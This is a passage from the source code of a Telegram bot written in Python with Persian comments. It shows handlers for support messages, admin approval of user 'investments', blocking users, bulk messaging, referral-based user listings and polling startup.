                caption=admin_text[:1024]  # محدودیت کپشن تلگرام
            )
        else:
            await context.bot.send_message(ADMIN_ID, admin_text)
        
        await update.message.reply_text(
            get_text(user_id, 'support_sent'),
            reply_markup=main_menu(user_id)
        )
    except Exception as e:
        logger.error(f"❌ Error sending support: {e}")
        await update.message.reply_text("⚠️ خطا در ارسال. لطفاً دوباره تلاش کنید.")

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(get_text(user_id, 'main_menu'), reply_markup=main_menu(user_id))
    context.user_data.clear()
    return ConversationHandler.END

async def admin_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    if query.from_user.id != ADMIN_ID:
        try:
            await query.edit_message_text("⛔ Unauthorized.")
        except:
            pass
        return
    action, inv_id = query.data.split('_')
    inv_id = int(inv_id)
    inv = get_investment(inv_id)
    if not inv:
        try:
            await query.edit_message_text("❌ Not found.")
        except:
            pass
        return
    if action == 'approve':
        update_investment_status(inv_id, 'approved')
        try:
            await context.bot.send_message(inv[1], get_text(inv[1], 'approved'))
            await query.edit_message_text(f"✅ Investment {inv_id} approved.")
        except:
            pass
    else:
        update_investment_status(inv_id, 'rejected')
        try:
            await context.bot.send_message(inv[1], get_text(inv[1], 'rejected'))
            await query.edit_message_text(f"❌ Investment {inv_id} rejected.")
        except:
            pass

async def admin_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("📌 /block user_id")
        return
    try:
        target = int(args[0])
        block_user(target)
        await update.message.reply_text(f"✅ User {target} blocked.")
    except:
        await update.message.reply_text("❌ Invalid ID.")

async def admin_unblock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("📌 /unblock user_id")
        return
    try:
        target = int(args[0])
        unblock_user(target)
        await update.message.reply_text(f"✅ User {target} unblocked.")
    except:
        await update.message.reply_text("❌ Invalid ID.")

async def admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "📌 Usage:\n"
            "• Text: /send id1,id2,... message\n"
            "• Media: reply to a photo/video with /send id1,id2,..."
        )
        return

    # حالت ریپلای روی عکس یا ویدیو
    reply = update.message.reply_to_message
    if reply and (reply.photo or reply.video):
        ids = [int(x) for x in args[0].split(',') if x.strip().isdigit()]
        caption = ' '.join(args[1:]) if len(args) > 1 else (reply.caption or "")
        success = 0
        for uid in ids:
            try:
                if reply.photo:
                    await context.bot.send_photo(
                        uid,
                        reply.photo[-1].file_id,
                        caption=caption if caption else None
                    )
                elif reply.video:
                    await context.bot.send_video(
                        uid,
                        reply.video.file_id,
                        caption=caption if caption else None
                    )
                success += 1
            except Exception as e:
                logger.error(f"❌ Send media to {uid} failed: {e}")
        await update.message.reply_text(f"✅ Sent to {success} of {len(ids)} users.")
        return

    # حالت متنی معمولی (مثل قبل)
    if len(args) < 2:
        await update.message.reply_text("📌 /send id1,id2,... message")
        return
    ids = [int(x) for x in args[0].split(',') if x.strip().isdigit()]
    msg = ' '.join(args[1:])
    success = 0
    for uid in ids:
        try:
            await context.bot.send_message(uid, f"📩 New message:\n{msg}")
            success += 1
        except:
            pass
    await update.message.reply_text(f"✅ Sent to {success} of {len(ids)} users.")

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized!")
        return
    
    users = get_all_users()
    if not users:
        await update.message.reply_text("📭 No users registered yet.")
        return
    
    lines = ["📊 *All Users:*\n"]
    lines.append("─" * 30)
    
    for idx, user in enumerate(users, 1):
        user_id = user['user_id']
        created_at = user['created_at']
        referrer_id = user['referrer_id']
        referral_count = user['referral_count']
        
        ref_text = f"{referrer_id}" if referrer_id else "Direct"
        
        lines.append(f"*{idx}.* `{user_id}`")
        lines.append(f"   📅 {created_at}")
        lines.append(f"   👤 Referrer: {ref_text}")
        lines.append(f"   👥 Referrals: {referral_count}")
        lines.append("─" * 30)
    
    full_text = "\n".join(lines)
    
    if len(full_text) > 4000:
        parts = [full_text[i:i+4000] for i in range(0, len(full_text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode='Markdown')
    else:
        await update.message.reply_text(full_text, parse_mode='Markdown')

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(get_text(user_id, 'main_menu'), reply_markup=main_menu(user_id))

# ======================== تنظیمات منو ========================
async def set_menu(app):
    try:
        await app.bot.set_chat_menu_button(menu_button=MenuButtonCommands())
        logger.info("✅ Blue menu button set.")
    except Exception as e:
        logger.error(f"❌ Menu button error: {e}")

async def set_commands(app):
    commands = [
        BotCommand("start", "Start the bot"),
        BotCommand("support", "Contact support"),
    ]
    await app.bot.set_my_commands(commands)
    logger.info("✅ Hamburger menu commands set.")

# ======================== اجرای اصلی ========================
def main():
    # ---------- اجرای سرور HTTP در یک ترد جداگانه برای Render ----------
    server_thread = threading.Thread(target=run_http_server, daemon=True)
    server_thread.start()
    logger.info(f"✅ HTTP Server started on port {os.environ.get('PORT', 10000)}")

    # ---------- ساخت اپلیکیشن تلگرام ----------
    app = Application.builder().token(TOKEN).build()

    # ---------- هندلر مکالمه ----------
    conv = ConversationHandler(
        entry_points=[
            CommandHandler('support', support_command),
            CallbackQueryHandler(menu_callback, pattern='^(invest|recharge|plan_.*|support)$'),
        ],
        states={
            WAIT_SCREENSHOT: [
                MessageHandler(filters.PHOTO, screenshot_handler),
                MessageHandler(filters.TEXT & ~filters.COMMAND, screenshot_handler)
            ],
            WAIT_WALLET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_handler),
                MessageHandler(filters.PHOTO, wallet_handler)
            ],
            WAIT_SUPPORT: [
                MessageHandler(filters.PHOTO, support_message_handler),
                MessageHandler(filters.TEXT & ~filters.COMMAND, support_message_handler)
            ],
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            CallbackQueryHandler(menu_callback, pattern='^back$')
        ],
        allow_reentry=True,
        per_message=False,
    )

    # ---------- ثبت هندلرها ----------
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(lang_callback, pattern='^lang_'))
    app.add_handler(CallbackQueryHandler(go_menu_callback, pattern='^go_menu$'))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern='^(referral|about|change_lang|back)$'))
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(admin_approve, pattern='^(approve|reject)_'))
    app.add_handler(CommandHandler('block', admin_block))
    app.add_handler(CommandHandler('unblock', admin_unblock))
    app.add_handler(CommandHandler('send', admin_send))
    app.add_handler(CommandHandler('users', admin_users))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    # ---------- تنظیمات اولیه ----------
    loop = asyncio.get_event_loop()
    loop.run_until_complete(set_menu(app))
    loop.run_until_complete(set_commands(app))

    # ---------- اجرای ربات با پولینگ ----------
    logger.info("🚀 Starting bot with Polling (timeout=60s)")
    app.run_polling(
        poll_interval=1.0,
        timeout=60,
        read_timeout=60,
        write_timeout=60,
        connect_timeout=60,
        pool_timeout=60,
        drop_pending_updates=True
    )

if __name__ == '__main__':
    main()